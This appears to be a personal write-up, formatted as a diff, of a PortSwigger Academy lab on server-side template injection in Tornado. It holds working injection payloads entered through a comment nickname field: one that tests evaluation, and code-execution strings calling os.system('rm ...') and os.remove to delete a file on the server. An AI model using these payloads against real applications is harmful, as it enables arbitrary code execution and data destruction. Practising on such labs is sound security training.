@@ -1,0 +1,52 @@
+Practitioner level lab from Portswigger academy
+
+
+Noticing that we can input anything for the post request regarding the nickname/preferred name section, and that the nickname/preferred name section effects the way our user name is presented when we comment something 
+
+I though the HTML tornado template might look something like this: 
+```
+{% for comment in comments %}
+  <div class="comment">
+	    <span class="nickname">{{ comment.user.USER_INPUT_PREFERENCE }} {% add(1,2) %} </span>
+    <p class="body">{{ comment.body }}</p>
+  </div>
+{% end %}
+```
+with USER_INPUT_PREFERENCE being what we input (ie name, nickname)
+
+I decided to input``  }} {{ 1 + 2 ``  (url encoded) to make:
+
+
+![[Pasted image 20251017171805.png]]
+
+resulting in 
+
+![[Pasted image 20251017171545.png]]
+
+now that we know that the SSTI works because of the user input being reflected dynamically (i.e 1 + 2 didn't show up as "1+2" rather as "3") time to try running commands 
+
+
+
+```
+ }} {{ __import__('builtins').exec("import os; os.system('rm morale.txt')")
+
+```
+
+which doesn't work getting us 
+
+```
+No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 10 _tt_tmp = __import__('builtins').exec("import os; os.system('rm morale.txt')") # <string>:1 ^ SyntaxError: invalid syntax
+```
+
+I input this to the 
+```
+ }} {{ __import__('os').remove('morale.txt') 
+
+```
+
+
+![[Pasted image 20251017221904.png]]
+and when we refresh the comment section we see  that the code was executed and that the lab was completed
+![[Pasted image 20251017222024.png]]
+
+![[Pasted image 20251017221925.png]]
